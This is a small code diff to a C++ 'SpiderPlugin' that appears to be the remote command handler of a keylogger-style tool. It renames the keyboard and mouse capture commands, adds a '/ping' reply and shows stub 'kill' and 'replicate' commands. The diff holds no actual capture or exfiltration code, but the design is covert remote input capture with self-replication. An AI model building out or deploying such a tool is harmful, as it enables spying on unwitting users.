@@ -27,10 +27,11 @@ namespace spider
 #endif
       {
 	m_cmd["/getInfos"] = [this]() { getInfos(); };
-	m_cmd["/getKeyboard"] = [this]() { getKeyboard(); };
-	m_cmd["/getMouse"] = [this]() { getMouse(); };
+	m_cmd["/setKeyboardEmission"] = [this]() { getKeyboard(); };
+	m_cmd["/setMouseEmission"] = [this]() { getMouse(); };
 	m_cmd["/kill"] = [this]() { kill(); };
 	m_cmd["/replicate"] = [this]() { replicate(); };
+	m_cmd["/ping"] = [this]() { ping(); };
       }
 
       SpiderPlugin::~SpiderPlugin()
@@ -165,6 +166,11 @@ namespace spider
       void SpiderPlugin::replicate()
       {
 	m_networkResponseQueue.push("KO\r\n");
+      }
+
+      void SpiderPlugin::ping()
+      {
+	m_networkResponseQueue.push("OK\r\n");
       }
 
       void SpiderPlugin::run()
